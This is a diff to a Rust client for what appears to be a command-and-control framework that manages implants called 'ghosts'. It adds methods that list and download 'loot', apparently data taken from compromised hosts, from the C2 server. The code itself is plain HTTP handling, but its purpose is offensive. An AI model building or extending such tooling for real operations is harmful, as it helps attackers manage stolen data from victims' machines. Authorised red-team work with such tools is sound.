@@ -12,6 +12,8 @@ pub trait C2Client: Send + Sync {
     async fn update_config(&self, ghost_id: &str, config: GhostConfigUpdate) -> Result<String, String>;
     async fn kill_ghost(&self, ghost_id: &str) -> Result<String, String>;
     async fn request_build(&self, req: GhostBuildRequest) -> Result<String, String>;
+    async fn fetch_loot_list(&self) -> Result<Vec<String>, String>;
+    async fn download_loot(&self, filename: &str, dest_path: &str) -> Result<String, String>;
 }
 
 pub struct RealClient {
@@ -150,6 +152,35 @@ impl C2Client for RealClient {
             let status = res.status();
             let error_message = res.text().await.unwrap_or_default();
             Err(format!("Server returned error {}: {}", status, error_message))
+        }
+    }
+
+    async fn fetch_loot_list(&self) -> Result<Vec<String>, String> {
+        let url = format!("{}/loot", self.base_url);
+        self.http
+            .get(&url)
+            .send()
+            .await
+            .map_err(|e| format!("Network error {}", e))?
+            .json::<Vec<String>>()
+            .await
+            .map_err(|e| format!("Failed to parse loot list json {}", e))
+    }
+
+    async fn download_loot(&self, filename: &str, dest_path: &str) -> Result<String, String> {
+        let url = format!("{}/loot/download/{}", self.base_url, filename);
+        let res = self.http
+            .get(&url)
+            .send()
+            .await
+            .map_err(|e| format!("Failed to download loot {}", e))?;
+
+        if res.status().is_success() {
+            let bytes = res.bytes().await.map_err(|e| format!("Failed to read bytes {}", e))?;
+            std::fs::write(dest_path, &bytes).map_err(|e| format!("Failed to save file {}", e))?;
+            Ok(format!("Loot saved to {}", dest_path))
+        } else {
+            Err(format!("Server returned error {}", res.status()))
         }
     }
 }
